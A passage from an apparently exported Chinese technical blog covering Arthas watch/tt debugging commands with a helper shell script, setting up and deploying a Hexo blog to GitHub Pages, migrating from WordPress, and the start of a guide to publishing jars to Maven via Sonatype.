<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">watch com.test.UserService query <span class="string">&quot;&#123;params,returnObj,throwExp&#125;&quot;</span> -x 3 -n 3</span><br></pre></td></tr></table></figure>
<p>2，把观测数据记录到文件中</p>
<p>命令：监测命令 &gt; 日志路径 &amp;</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">watch com.test.UserService query <span class="string">&quot;&#123;params,returnObj,throwExp&#125;&quot;</span> -x 3 -n 10 &gt; /tmp/arthas/watch.log &amp;</span><br></pre></td></tr></table></figure>
<p>3，增加耗时条件，cost&gt;200(单位是ms)表示只有当耗时大于200ms时才会输出</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">watch com.test.UserService query <span class="string">&quot;&#123;params,returnObj,throwExp&#125;&quot;</span> -x 3 -n 3 <span class="string">&quot;#cost&gt;200&quot;</span></span><br></pre></td></tr></table></figure>
<p>4，发生异常才观测，使用-e表示抛出异常时才触发收集，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">watch com.test.UserService query <span class="string">&quot;&#123;params,returnObj,throwExp&#125;&quot;</span> -x 3 -n 3 -e</span><br></pre></td></tr></table></figure>
<p>5，如果想查看方法运行前后，当前对象中的属性，可以使用target关键字，代表当前对象，也可以使用target.field_name访问当前对象的某个属性</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">watch com.test.UserService query -n 3 <span class="string">&quot;target&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="tt命令使用"><a href="#tt命令使用" class="headerlink" title="tt命令使用"></a>tt命令使用</h4><p>1,使用tt命令记录下方法的每次调用环境现场，次数=20：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tt -t -n 20 com.test.UserService query</span><br></pre></td></tr></table></figure>
<p>2,使用tt -l可以查看记录的列表：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tt -l</span><br></pre></td></tr></table></figure>
<p>3,使用tt -i index查看调用信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tt -i [替换为INDEX]</span><br></pre></td></tr></table></figure>
<p>4,使用tt -i index -p重新发起一次请求：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tt -i [替换为INDEX] -p</span><br></pre></td></tr></table></figure>
<p>5，tt跟踪的记录，如果需要清除，可以直接shutdown退出arthas命令</p>
<h4 id="shell快速操作脚本生成"><a href="#shell快速操作脚本生成" class="headerlink" title="shell快速操作脚本生成"></a>shell快速操作脚本生成</h4><p>脚本名称：arthas.sh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#author: chenguolin</span></span><br><span class="line">p1=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$1</span>&quot;</span> = <span class="string">&quot;&quot;</span> ];<span class="keyword">then</span></span><br><span class="line">     <span class="built_in">echo</span>  <span class="string">&quot;请传入：方法Reference！如：sh arthas.sh com.test.UserService#query&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----------------------start--------------------------&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;#####################生成方法监测命令tt和watch##################&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;1,使用watch命令观察到方法的参数、返回和异常情况，深度=3、次数=3：&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;watch &#x27;</span><span class="variable">$&#123;p1%#*&#125;</span><span class="string">&#x27; &#x27;</span><span class="variable">$&#123;p1##*#&#125;</span><span class="string">&#x27; &quot;&#123;params,returnObj,throwExp&#125;&quot; -x 3 -n 3&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;2,将观察记录到本地文件中：&#x27;</span></span><br><span class="line"><span class="built_in">echo</span>  <span class="string">&#x27;watch &#x27;</span><span class="variable">$&#123;p1%#*&#125;</span><span class="string">&#x27; &#x27;</span><span class="variable">$&#123;p1##*#&#125;</span><span class="string">&#x27; &quot;&#123;params,returnObj,throwExp&#125;&quot; -x 3 -n 10 &gt; /tmp/arthas/watch.log &amp;&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;3,只观察异常的请求：&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;watch &#x27;</span><span class="variable">$&#123;p1%#*&#125;</span><span class="string">&#x27; &#x27;</span><span class="variable">$&#123;p1##*#&#125;</span><span class="string">&#x27; &quot;&#123;params,returnObj,throwExp&#125;&quot; -x 3 -n 3 -e&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;4,只观察大于200毫秒的请求：&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;watch &#x27;</span><span class="variable">$&#123;p1%#*&#125;</span><span class="string">&#x27; &#x27;</span><span class="variable">$&#123;p1##*#&#125;</span><span class="string">&#x27; &quot;&#123;params,returnObj,throwExp&#125;&quot; -x 3 -n 3 &quot;#cost&gt;200&quot;&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;5,观察请求方法对象，使用类似target.user形式的命令查看对象：&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;watch &#x27;</span><span class="variable">$&#123;p1%#*&#125;</span><span class="string">&#x27; &#x27;</span><span class="variable">$&#123;p1##*#&#125;</span><span class="string">&#x27; -n 3 &quot;target&quot;&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;6,使用tt命令记录下方法的每次调用环境现场，次数=20：&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;tt -t -n 20 &#x27;</span><span class="variable">$&#123;p1%#*&#125;</span><span class="string">&#x27; &#x27;</span><span class="variable">$&#123;p1##*#&#125;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;7,使用tt -l可以查看记录的列表：&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;tt -l&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;8,使用tt -i index查看调用信息：&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;tt -i [替换为INDEX]&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;9,使用tt -i index -p重新发起一次请求：&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;tt -i [替换为INDEX] -p&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;10,使用tt -i index -w &#x27;</span>target<span class="string">&#x27;查看对象信息，也使用类似target.user形式的命令查看对象：&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;tt -i [替换为INDEX] -w &#x27;target&#x27;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----------------------end----------------------------&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>使用示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh arthas.sh com.test.UserService<span class="comment">#query</span></span><br></pre></td></tr></table></figure>
<p>生成脚本示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----------------------start--------------------------</span><br><span class="line"></span><br><span class="line">#####################生成方法监测命令tt和watch##################</span><br><span class="line"></span><br><span class="line">1,使用watch命令观察到方法的参数、返回和异常情况，深度&#x3D;3、次数&#x3D;3：</span><br><span class="line">watch com.test.UserService query &quot;&#123;params,returnObj,throwExp&#125;&quot; -x 3 -n 3</span><br><span class="line"></span><br><span class="line">2,将观察记录到本地文件中：</span><br><span class="line">watch com.test.UserService query &quot;&#123;params,returnObj,throwExp&#125;&quot; -x 3 -n 10 &gt; &#x2F;tmp&#x2F;arthas&#x2F;watch.log &amp;</span><br><span class="line"></span><br><span class="line">3,只观察异常的请求：</span><br><span class="line">watch com.test.UserService query &quot;&#123;params,returnObj,throwExp&#125;&quot; -x 3 -n 3 -e</span><br><span class="line"></span><br><span class="line">4,只观察大于200毫秒的请求：</span><br><span class="line">watch com.test.UserService query &quot;&#123;params,returnObj,throwExp&#125;&quot; -x 3 -n 3 &quot;#cost&gt;200&quot;</span><br><span class="line"></span><br><span class="line">5,观察请求方法对象，使用类似target.user形式的命令查看对象：</span><br><span class="line">watch com.test.UserService query -n 3 &quot;target&quot;</span><br><span class="line"></span><br><span class="line">6,使用tt命令记录下方法的每次调用环境现场，次数&#x3D;20：</span><br><span class="line">tt -t -n 20 com.test.UserService query</span><br><span class="line"></span><br><span class="line">7,使用tt -l可以查看记录的列表：</span><br><span class="line">tt -l</span><br><span class="line"></span><br><span class="line">8,使用tt -i index查看调用信息：</span><br><span class="line">tt -i [替换为INDEX]</span><br><span class="line"></span><br><span class="line">9,使用tt -i index -p重新发起一次请求：</span><br><span class="line">tt -i [替换为INDEX] -p</span><br><span class="line"></span><br><span class="line">10,使用tt -i index -w target查看对象信息，也使用类似target.user形式的命令查看对象：</span><br><span class="line">tt -i [替换为INDEX] -w &#39;target&#39;</span><br><span class="line"></span><br><span class="line">----------------------end----------------------------</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>arthas</category>
      </categories>
      <tags>
        <tag>arthas</tag>
        <tag>watch</tag>
        <tag>tt</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo博客搭建</title>
    <url>/2020/06/14/blog-create-hexo/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>Hexo是基于Nodejs的轻量级博客系统，使用Markdown来渲染文章，体积小、快速、简洁、安装简单。</p>
<a id="more"></a>
<h4 id="搭建步骤"><a href="#搭建步骤" class="headerlink" title="搭建步骤"></a>搭建步骤</h4><p>安装git和node工具，前置工作，不做详细介绍</p>
<h5 id="安装yarn"><a href="#安装yarn" class="headerlink" title="安装yarn"></a>安装yarn</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g yarn</span><br></pre></td></tr></table></figure>
<h5 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn global add hexo</span><br></pre></td></tr></table></figure>
<h5 id="初始化hexo"><a href="#初始化hexo" class="headerlink" title="初始化hexo"></a>初始化hexo</h5><p>创建一个目录，作为博客的目录，并执行以下命令进行初始化</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir hexo</span><br><span class="line"><span class="built_in">cd</span> hexo</span><br><span class="line">hexo init</span><br></pre></td></tr></table></figure>
<h5 id="启动博客"><a href="#启动博客" class="headerlink" title="启动博客"></a>启动博客</h5><p>查看public目录是否已经生成，如果没有，执行下面的命令生成，后续修改主题、配置等，如果遇到找不到页面的情况，均可使用下面的命令重新生成。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br></pre></td></tr></table></figure>
<p>后台模式启动</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo s &amp;</span><br></pre></td></tr></table></figure>
<p>debug模式启动</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo s --debug</span><br></pre></td></tr></table></figure>
<p>访问：<a href="http://localhost:4000/">http://localhost:4000</a></p>
<h4 id="更换博客主题"><a href="#更换博客主题" class="headerlink" title="更换博客主题"></a>更换博客主题</h4><p>默认的博客主题可能并不能打动我们，所以我们要选择一款喜欢的主题，这里使用的是maupassant主题。</p>
<p>1，获取主题，在hexo目录下执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/tufu9441/maupassant-hexo.git themes/maupassant</span><br></pre></td></tr></table></figure>
<p>2，安装主题依赖</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-renderer-pug --save</span><br><span class="line">npm install hexo-renderer-sass --save</span><br></pre></td></tr></table></figure>
<p>3，启用主题，只需要修改站点配置文件_config.yml即可，设置theme参数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">theme: maupassant</span><br></pre></td></tr></table></figure>

<h4 id="网站图标设置"><a href="#网站图标设置" class="headerlink" title="网站图标设置"></a>网站图标设置</h4><p>将favicon.ico放在Hexo根目录的source文件夹下即可，建议的大小：32px*32px</p>
<h4 id="设置搜索功能"><a href="#设置搜索功能" class="headerlink" title="设置搜索功能"></a>设置搜索功能</h4><p>1，安装插件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure>
<p>2，修改站点配置，修改配置文件，设置search参数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  <span class="built_in">limit</span>: 10000</span><br></pre></td></tr></table></figure>
<p>3，修改主题配置，开启self_search，并关闭其他搜索</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">self_search: <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h4 id="设置rss功能"><a href="#设置rss功能" class="headerlink" title="设置rss功能"></a>设置rss功能</h4><p>1，安装RSS插件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-feed</span><br></pre></td></tr></table></figure>
<p>2，修改站点配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Extensions</span></span><br><span class="line">plugins:</span><br><span class="line">    hexo-generator-feed</span><br><span class="line"><span class="comment">#Feed Atom</span></span><br><span class="line">feed:</span><br><span class="line">    <span class="built_in">type</span>: atom</span><br><span class="line">    path: atom.xml</span><br><span class="line">    <span class="built_in">limit</span>: 20</span><br></pre></td></tr></table></figure>
<h4 id="在底部添加备案信息"><a href="#在底部添加备案信息" class="headerlink" title="在底部添加备案信息"></a>在底部添加备案信息</h4><p>进入目录：hexo/themes/maupassant/layout/_partial，找到文件：footer.pug，添加如下代码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">|  非爱青山绿水，惟图隐迹埋石。</span><br><span class="line">| 备案信息：</span><br><span class="line">a(rel=<span class="string">&#x27;nofollow&#x27;</span>, target=<span class="string">&#x27;_blank&#x27;</span>, href=<span class="string">&quot;http://www.miitbeian.gov.cn/&quot;</span>) 浙-ICP备xxxxx号</span><br></pre></td></tr></table></figure>

<h4 id="文章模版设置"><a href="#文章模版设置" class="headerlink" title="文章模版设置"></a>文章模版设置</h4><p>正常情况下，我们使用“hexo new 文章名”命令就能创建一篇文章，而且会自动给我们生成文章的front-matter模版信息，但是这个模版可能不一定适用，<br>所以我们最好是创建一个自己常用的模版，这样会方便很多。</p>
<p>如何设置模版呢？在hexo根目录下，有一个“scaffolds”文件夹，里面有draft.md,page.md,post.md 3个模版文件，文章对应的post.md，我们只需要更改这个文件的内容即可。</p>
<p>我们设置模版内容如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: &#123;&#123; title &#125;&#125; <span class="comment">#文章标题</span></span><br><span class="line">date: &#123;&#123; date &#125;&#125; <span class="comment">#文章时间</span></span><br><span class="line">toc: <span class="literal">true</span> <span class="comment">#是否显示目录</span></span><br><span class="line">categories: <span class="comment">#文章分类，如果是多个分类，必须用[]括起来，否则就会成为上一个分类的子类</span></span><br><span class="line">     - [分类名称]</span><br><span class="line">tags: <span class="comment">#文章标签</span></span><br><span class="line">     - 标签名称</span><br><span class="line">description: 摘要内容 <span class="comment">#自定义显示的摘要，或者直接在文章内容中插入&lt;!--more--&gt;以隐藏后面的内容</span></span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<h4 id="文章版权信息设置"><a href="#文章版权信息设置" class="headerlink" title="文章版权信息设置"></a>文章版权信息设置</h4><p>文章需要添加版权信息？安排！</p>
<p>1，首先到主题的_config.yml文件中开启版权配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">post_copyright:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span> </span><br><span class="line">  author: guolin </span><br></pre></td></tr></table></figure>
<p>2，替换主题版权页面代码，文件位置：主题/layout/_widget/copyright.pug</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">div</span><br><span class="line">  link(rel=<span class="string">&#x27;stylesheet&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;text/css&#x27;</span>, href=<span class="string">&#x27;/css/copyright.css&#x27;</span>)</span><br><span class="line">  ul.post-copyright</span><br><span class="line">    li.post-copyright-author</span><br><span class="line">    strong 本文作者：</span><br><span class="line">    = theme.post_copyright.author</span><br><span class="line">    li.post-copyright-link</span><br><span class="line">    strong 本文链接：</span><br><span class="line">    a(href=<span class="string">&#x27;/&#x27;</span> + page.path)= page.permalink</span><br><span class="line">    li.post-copyright-license</span><br><span class="line">    strong 版权声明：</span><br><span class="line">    | 本博客所有文章除特别声明外，均采用 &lt;a href=<span class="string">&quot;http://creativecommons.org/licenses/by-nc-sa/3.0/cn/&quot;</span> rel=<span class="string">&quot;external nofollow&quot;</span> target=<span class="string">&quot;_blank&quot;</span>&gt;CC BY-NC-SA 3.0 CN&lt;/a&gt; 许可协议。转载请注明出处！</span><br><span class="line">br</span><br></pre></td></tr></table></figure>
<p>3，替换主题版权页面的样式，文件位置：主题/source/css/copyright.css</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.post-copyright</span> &#123;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">2em</span> <span class="number">0</span> <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0.5em</span> <span class="number">1em</span>;</span><br><span class="line">  <span class="attribute">border-left</span>: <span class="number">3px</span> solid <span class="number">#FF1700</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#F9F9F9</span>;</span><br><span class="line">  <span class="attribute">list-style</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.post-copyright</span>  <span class="selector-tag">li</span>&#123;<span class="attribute">margin</span>:<span class="number">8px</span> <span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="配置Github托管"><a href="#配置Github托管" class="headerlink" title="配置Github托管"></a>配置Github托管</h4><p>1，到github站点，创建托管站点的仓库</p>
<p>点击：new repository</p>
<p>填写仓库名为：Github用户名.github.io，这里必须这样填写，否则无法访问，我这里如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ln-guolin.github.io</span><br></pre></td></tr></table></figure>
<p>选中：Initialize this repository with a README</p>
<p>2，修改站点配置，增加git信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">    <span class="built_in">type</span>: git</span><br><span class="line">    repo: https://github.com/Ln-guolin/Ln-guolin.github.io.git</span><br><span class="line">    branch: master</span><br></pre></td></tr></table></figure>
<p>3，安装git插件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-deployer-git</span><br></pre></td></tr></table></figure>
<p>4，发布站点到github，会让你输入github账号密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo deploy</span><br></pre></td></tr></table></figure>
<p>好了，截止此步骤，已经可以通过“Ln-guolin.github.io”访问自己的站点了</p>
<p>5，我们继续配置，使用自己的域名绑定到站点</p>
<p>根据路径:站点仓库 &gt;&gt; Settings &gt;&gt; GitHub Pages &gt;&gt; Custom domain，找到custom domain，并填写自己的域名。</p>
<p>然后，我们去配置域名的cname解析记录到站点即可，记录值：Ln-guolin.github.io。</p>
<p>如果是1级域名，要解析@和www两个记录，配置完成后就能通过域名访问啦</p>
<p>6，关键步骤，配置好域名之后，我们每次hexo deploy都会导致github pages settings的domain配置被清空，所以我们需要在站点source目录下创建一个CNAME文件，内容为你的域名即可。</p>
<h4 id="配置顶部菜单和友链"><a href="#配置顶部菜单和友链" class="headerlink" title="配置顶部菜单和友链"></a>配置顶部菜单和友链</h4><p>1，顶部菜单，到主题下的配置文件中，修改menu参数，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">menu:</span><br><span class="line">  - page: home</span><br><span class="line">    directory: .</span><br><span class="line">    icon: fa-home</span><br><span class="line">  - page: archive</span><br><span class="line">    directory: archives/</span><br><span class="line">    icon: fa-archive</span><br><span class="line">  - page: Utils</span><br><span class="line">    directory: utils/</span><br><span class="line">    icon: fa-wrench</span><br><span class="line">  - page: about</span><br><span class="line">    directory: about/</span><br><span class="line">    icon: fa-user</span><br><span class="line">  - page: rss</span><br><span class="line">    directory: atom.xml</span><br><span class="line">    icon: fa-rss</span><br></pre></td></tr></table></figure>
<p>菜单的图标</p>
<p>2，友情链接，到主题下的配置文件中，修改link参数，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">links:</span><br><span class="line">  - title: blog.soilove.cn</span><br><span class="line">    url: https://blog.soilove.cn/</span><br><span class="line">  - title: github</span><br><span class="line">    url: https://github.com/Ln-guolin</span><br><span class="line">  - title: dockerhub</span><br><span class="line">    url: https://hub.docker.com/u/guolin123</span><br></pre></td></tr></table></figure>

<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><h5 id="新建文章发布"><a href="#新建文章发布" class="headerlink" title="新建文章发布"></a>新建文章发布</h5><p>1，新建文章，hexo会生成一个.md文件，位置：hexo/source/_posts，在里面写文章即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new 文章</span><br></pre></td></tr></table></figure>
<p>2，生产静态文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo g</span><br></pre></td></tr></table></figure>
<p>3，发布文章</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo deploy</span><br></pre></td></tr></table></figure>
<h5 id="新建页面发布"><a href="#新建页面发布" class="headerlink" title="新建页面发布"></a>新建页面发布</h5><p>新建about页面</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new page <span class="string">&quot;about&quot;</span></span><br></pre></td></tr></table></figure>
<h5 id="文章内嵌网页"><a href="#文章内嵌网页" class="headerlink" title="文章内嵌网页"></a>文章内嵌网页</h5><p>希望在文章中嵌入网页，我们可以使用iframe标签实现，具体代码示例如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://util.soilove.cn/json/&quot;</span> </span></span><br><span class="line"><span class="tag"><span class="attr">width</span>=<span class="string">100%</span> <span class="attr">height</span>=<span class="string">800px</span> <span class="attr">frameborder</span>=<span class="string">0</span> <span class="attr">allowfullscreen</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="文章内嵌视频"><a href="#文章内嵌视频" class="headerlink" title="文章内嵌视频"></a>文章内嵌视频</h5><p>在文章中嵌入视频，我们同样可以使用iframe标签实现，这一刻是不是觉得iframe太好用了[笑哭]，具体代码示例如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/lehuo/hy.mp4&quot;</span> </span></span><br><span class="line"><span class="tag"><span class="attr">width</span>=<span class="string">600</span> <span class="attr">height</span>=<span class="string">350</span> <span class="attr">frameborder</span>=<span class="string">0</span> <span class="attr">allowfullscreen</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="文章内嵌图片"><a href="#文章内嵌图片" class="headerlink" title="文章内嵌图片"></a>文章内嵌图片</h5><p>在文章中嵌入图片，常用的有2种方法，一个是markdown自身语法支持的写法，一个是使用img标签，我们来看看。</p>
<p>markdown图片插入方法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">![图片名称](https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/%E9%93%BE%E8%A1%A8.png)</span><br></pre></td></tr></table></figure>
<p>img标签插入方法：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/%E9%93%BE%E8%A1%A8.png&quot;</span> </span></span><br><span class="line"><span class="tag"><span class="attr">width</span> = <span class="string">&quot;300px&quot;</span> <span class="attr">height</span> = <span class="string">&quot;200px&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;图片名称&quot;</span> <span class="attr">align</span>=<span class="string">left</span> /&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>博客设置</tag>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>从WordPress迁移到Hexo小记</title>
    <url>/2020/07/10/blog-wordpress-to-hexo/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>前段时间，用了好几年的ECS服务器又到了续费的时候了，说巧也挺巧，正值阿里云618大促，自己又换了手机号。</p>
<p>总算蹭上了一波新用户福利，感概了一下这几年续费的心酸，扎心肉痛。</p>
<p>趁此契机，在迁移服务器资源的同时，把wp博客迁移到hexo，改用github来托管，毕竟能少一台服务器就少一台吧，不想再割肉了[笑死]。</p>
<h4 id="迁移"><a href="#迁移" class="headerlink" title="迁移"></a>迁移</h4><p>还记得当时搭博客写文章的时候，才刚毕业不久，初生牛犊，看什么都是新鲜的，见啥写啥。几年时间就4、5百多篇了，前两年又没时间去写，<br>现在突然翻出来一看，哎哟，那质量，还真是不忍直视，惨不忍睹啊，还是该扔扔吧</p>
<p>1，文章导出，登录wp博客后台，找到登录后台 &gt;&gt; 工具 &gt;&gt; 导出，选择导出文章，然后点击“下载导出的文件”。</p>
<p>2，导出后会得到一个xml文件，如：soilove.WordPress.2020-07-09.xml，我们需要在hexo的机器上安装一个插件“hexo-migrator-wordpress”，用来转换xml中的文章</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-migrator-wordpress --save</span><br></pre></td></tr></table></figure>

<p>3，使用插件转换文章，生成我们需要的“.md”文章文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo migrate /path/soilove.WordPress.2020-07-09.xml</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>wordpress</tag>
      </tags>
  </entry>
  <entry>
    <title>发布jar到maven仓库</title>
    <url>/2020/06/16/deploy-jar-to-maven-repository/</url>
    <content><![CDATA[<h3 id="Sonatype站点账号和工单申请"><a href="#Sonatype站点账号和工单申请" class="headerlink" title="Sonatype站点账号和工单申请"></a>Sonatype站点账号和工单申请</h3><p>1，到sonatype jira站点：<a href="https://issues.sonatype.org/">直达链接</a>，注册账号，创建jira工单，填写如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">项目：Community Support - Open Source Project Repository Hosting</span><br><span class="line">类型：new project</span><br><span class="line">概要：项目的描述</span><br><span class="line">Group Id：项目的groupid，最好是自己的域名</span><br><span class="line">Project Url：项目地址</span><br><span class="line">SCM Url：项目Git地址</span><br></pre></td></tr></table></figure>
<p>然提交成功后，注意关注jira工单或者邮箱，因为工作人员会验证你填写的信息，主要是group id域名的所有权。</p>
<p>2，验证域名所有权，需要到域名新增一个与jira工单关联的Txt类型的解析记录，配置示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">类型：txt</span><br><span class="line">主机记录：OSSRH-56616</span><br><span class="line">记录值：https:&#x2F;&#x2F;issues.sonatype.org&#x2F;browse&#x2F;OSSRH-56616</span><br></pre></td></tr></table></figure>
<p>配置完成后，到jira工单下留言告知，留言示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">This domain name is mine，And NDS TXT record has configured</span><br></pre></td></tr></table></figure>
<p>3，域名验证通过后，会邮件通知你结果，并告知下一步操作，通知示例：</p>
